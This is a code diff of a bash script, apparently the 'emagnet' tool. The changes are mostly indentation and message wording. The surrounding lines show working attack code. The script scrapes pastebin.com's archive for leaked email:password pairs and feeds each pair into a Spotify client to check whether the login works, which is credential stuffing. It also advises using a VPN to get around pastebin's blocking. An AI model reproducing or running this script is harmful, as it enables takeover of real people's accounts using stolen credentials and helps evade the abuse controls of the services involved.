@@ -668,7 +668,7 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
 	     while read line; do
                	SPOTIFY_USER="$(echo $line|cut -d: -f1)"
       	        SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
-	          ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
+	           ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
 	             if [[ "$?" -eq "0" ]]; then
         	      echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
                else
@@ -783,7 +783,7 @@ if [[ $? = "0" ]]; then
       emagnet_banned
  else
       echo -e "[\e[1;31m<<\e[0m] - You have been blocked by pastebin"
-      echo -e "[\e[1;31m<<\e[0m] - Enable a vpn or please try again later, aborted\n"
+      echo -e "[\e[1;31m<<\e[0m] - Enable a vpn or please try run emagnet in ~3600 seconds again, aborted\n"
       exit 1
  fi
 fi
@@ -837,18 +837,19 @@ emagnet_main() {
        tt="$(cat $HOME/.config/emagnet/tmp/.emagnet| wc -l)";[[ "$tt" -lt "10" ]] && tt="0$tt"
          if [[ "${tt}" -eq "00" ]]; then
            grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' "$EMAGNETTEMP"|cut -d: -f1|tr ' ' '\n'
-	   printf "[\e[1;31m<<\e[0m] - No new files could be downloaded..\n[\e[1;31m<<\e[0m] - Increase time or you will get banned anytime now..\n\n"
+	       printf "[\e[1;31m<<\e[0m] - No new files could be downloaded..\n[\e[1;31m<<\e[0m] - Increase time or you will get banned anytime now..\n\n"
            tt="\e[1;31m\e[5m00\e[0m"
       	   sleep 5 # Sleep here for make some room, this will not cause any problems with missing files
            emagnet_clear;emagnet_banner
          else
-         echo -e "\n===================================================================\nPastebin URLS from: $(date +%d/%m/%Y\ -\ %H:%M)\n==================================================================="  >> "$EMAGNETLOGS/pastebin-urls.txt"
-         # cat "$HOME/.config/emagnet/tmp/.emagnet" >> "$EMAGNETLOGS/pastebin-urls.txt"
-         curl -H "$USERAGENT" -Ls "pastebin.com/archive"|awk -F'href="/' '{print $2}'|cut -d'"' -f1|awk 'length($0)>6 && length($0)<9'|grep -v 'archive\|contact\|settings\|messages\|signup\|index.html' |\
-         sed 's/^/https:\/\/pastebin.com\/raw\//g'|sed 's/$/ - Downloaded /g' > 1
-         curl -H "$USERAGENT" -Ls "pastebin.com/archive" |grep -i ago|cut -d'>' -f2|cut -d'<' -f1|sed '1d' > 2
-         paste 1 2|sed 's/ago/after upload/g'|sed 's/\t//g'|sed '$d' >> "$EMAGNETLOGS/pastebin-urls.txt"
-         rm "./1" "./2"
+           echo -e "\n===================================================================\nPastebin URLS from: $(date +%d/%m/%Y\ -\ %H:%M)\n==================================================================="  >> "$EMAGNETLOGS/pastebin-urls.txt"
+           # cat "$HOME/.config/emagnet/tmp/.emagnet" >> "$EMAGNETLOGS/pastebin-urls.txt"
+           curl -H "$USERAGENT" -Ls "pastebin.com/archive"|awk -F'href="/' '{print $2}'|cut -d'"' -f1|awk 'length($0)>6 && length($0)<9'| \
+           grep -v 'archive\|contact\|settings\|messages\|signup\|index.html' |\
+           sed 's/^/https:\/\/pastebin.com\/raw\//g'|sed 's/$/ - Downloaded /g' > 1
+           curl -H "$USERAGENT" -Ls "pastebin.com/archive" |grep -i ago|cut -d'>' -f2|cut -d'<' -f1|sed '1d' > 2
+           paste 1 2|sed 's/ago/after upload/g'|sed 's/\t//g'|sed '$d' >> "$EMAGNETLOGS/pastebin-urls.txt"
+           rm "./1" "./2"
         fi
 
 ef=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" "$EMAGNETTEMP"|awk -F':' '{print $1}'|awk -F, '!seen[$1]++')
